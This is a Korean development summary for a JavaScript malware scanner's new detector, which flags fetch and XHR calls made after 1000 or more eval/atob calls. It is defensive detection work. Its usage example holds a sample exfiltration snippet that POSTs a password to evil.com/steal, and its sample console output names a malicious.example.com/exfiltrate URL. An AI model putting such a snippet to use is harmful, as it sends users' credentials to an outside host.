# 구현 완료: 1000회 이상 함수 호출 후 Fetch 탐지

## ✅ 구현 완료 항목

### 1. 핵심 인프라 구축
- ✅ `DynamicAnalyzer`에 함수 호출 카운터 추가
  - `incrementFunctionCallCount()`
  - `getFunctionCallCount()`
  - `resetFunctionCallCount()`

### 2. 데이터 구조 확장
- ✅ `HookEvent`에 `status` 필드 추가
  - status = 0: 정상
  - status = 1: 1000회 이상 함수 호출 후 fetch (악성 의심)
- ✅ JSON 직렬화/역직렬화 지원

### 3. 카운터 증가 로직
- ✅ `GlobalObject::js_eval_hook()` - eval 호출 시
- ✅ `GlobalObject::js_atob()` - atob 호출 시
- ✅ `XMLHTTPRequestObject::analyzeRequestSecurity()` - XHR 호출 시

### 4. 탐지 로직 구현
- ✅ `WindowObject::js_fetch()` - fetch 호출 시 카운터 확인
  - 1000회 이상이면 status=1, severity=10 설정
  - 메타데이터에 function_call_count, excessive_function_calls 추가
  
- ✅ `XMLHTTPRequestObject::analyzeRequestSecurity()` - XHR 호출 시
  - fetch와 동일한 로직 적용

### 5. 테스트 및 문서화
- ✅ 테스트 파일 생성: `test/test_1000_calls_fetch.js`
- ✅ 구현 문서 작성: `docs/FUNCTION_CALL_COUNTER_IMPLEMENTATION.md`

## 📊 변경된 파일 목록

### 헤더 파일 (3개)
1. `core/DynamicAnalyzer.h` - 카운터 메서드 추가
2. `hooks/HookEvent.h` - status 필드 추가

### 소스 파일 (4개)
3. `core/DynamicAnalyzer.cpp` - 카운터 메서드 구현
4. `hooks/HookEvent.cpp` - status 초기화 및 JSON 처리
5. `builtin/objects/GlobalObject.cpp` - eval/atob에 카운터 증가
6. `builtin/objects/WindowObject.cpp` - fetch에서 카운터 확인 및 탐지
7. `builtin/objects/XMLHTTPRequestObject.cpp` - XHR에서 카운터 확인 및 탐지

### 테스트/문서 (2개)
8. `test/test_1000_calls_fetch.js` - 테스트 케이스
9. `docs/FUNCTION_CALL_COUNTER_IMPLEMENTATION.md` - 구현 문서

## 🔍 동작 방식

```
[시작]
   ↓
[함수 호출 1: eval()] → DynamicAnalyzer::functionCallCount = 1
   ↓
[함수 호출 2: atob()] → DynamicAnalyzer::functionCallCount = 2
   ↓
   ... (반복)
   ↓
[함수 호출 1000+: eval()] → DynamicAnalyzer::functionCallCount = 1000+
   ↓
[fetch() 호출]
   ↓
[카운터 확인: getFunctionCallCount() >= 1000?]
   ↓ YES
[🚨 status = 1 설정]
[🚨 severity = 10 설정]
[🚨 metadata에 플래그 추가]
   ↓
[HookEvent 기록]
   ↓
[JSON 리포트에 출력]
```

## 📝 사용 예시

### 입력 (악성 코드)
```javascript
// 1000번 이상 함수 호출
for (var i = 0; i < 1100; i++) {
    eval("var x = " + i);
}

// fetch 호출 → status=1로 탐지됨
fetch("https://evil.com/steal", {
    method: "POST",
    body: "password=12345"
});
```

### 출력 (JSON 리포트)
```json
{
  "hookEvents": [
    {
      "type": "FETCH_REQUEST",
      "name": "fetch",
      "status": 1,
      "severity": 10,
      "metadata": {
        "url": "https://evil.com/steal",
        "method": "POST",
        "function_call_count": 1100,
        "excessive_function_calls": true,
        "sensitive": true
      }
    }
  ]
}
```

## 🎯 주요 특징

1. **자동 탐지**: 1000회 이상 함수 호출 후 fetch/XHR 자동 감지
2. **상세 메타데이터**: 정확한 함수 호출 횟수 기록
3. **고위험도 분류**: severity 10으로 최우선 처리
4. **명확한 플래그**: status=1로 명확하게 구분
5. **로그 출력**: 콘솔에 경고 메시지 출력

## ⚠️ 알려진 제한사항

1. 일부 함수 호출은 아직 카운트되지 않음
   - Function() 생성자
   - setTimeout/setInterval
   - document.write 등

2. 카운터 리셋 정책 미정의
   - 현재는 수동 reset() 호출 시에만 리셋

3. 임계값 하드코딩
   - 1000회로 고정 (설정 가능하게 개선 필요)

## 🚀 다음 단계

1. 더 많은 함수 호출 지점에 카운터 추가
2. 임계값을 설정 파일로 관리
3. 함수 호출 패턴 분석 추가
4. false positive 최소화를 위한 추가 필터링

## ✅ 테스트 방법

```bash
cd D:\GIT\mon47-server\Src\Scanner\JSScanner
./JSScanner test/test_1000_calls_fetch.js
```

콘솔에서 다음 메시지 확인:
```
[ALERT] Suspicious fetch detected! Function call count: 1234 (>= 1000)
[ALERT] URL: https://malicious.example.com/exfiltrate, Method: POST
```

JSON 리포트에서 `status: 1` 확인
